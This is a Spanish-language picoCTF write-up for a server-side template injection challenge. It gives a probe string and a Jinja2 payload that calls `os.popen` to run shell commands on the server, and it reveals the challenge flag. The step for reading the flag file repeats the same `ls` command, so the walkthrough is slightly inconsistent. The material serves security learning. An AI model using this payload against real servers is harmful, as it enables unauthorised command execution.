
**Reto:**
Hacer una inyección a la platilla del sitio para obtener la bandera

**Descripción:**
-I made a cool website where you can announce whatever you want! Try it out!
-I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:56200/)!

**Solución:**
Descifrar la plantilla usada e ingresar un comando que revele la ubicación de la bandera.
-Abrir la página.
-Escribir en la entrada `${{<%[%'"}}%\` para verificar que haya una vulnerabilidad
-Escribir el siguiente comando en la página:`
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`
-Una vez encontrados los archivos, ingresar a la pagina el siguiente comando.
`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`
-Cuando se ingresa el comando en la página, la página mostrara el archivo con el texto en pantalla.

El resultado es: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}**.

**Notas adicionales:**
-Para verificar el tipo de plantilla usada, se tiene que seguir un proceso de entradas hasta encontrar la plantilla utilizada.

**Referencias:**
https://portswigger.net/web-security/server-side-template-injection
https://portswigger.net/web-security/server-side-template-injection/exploiting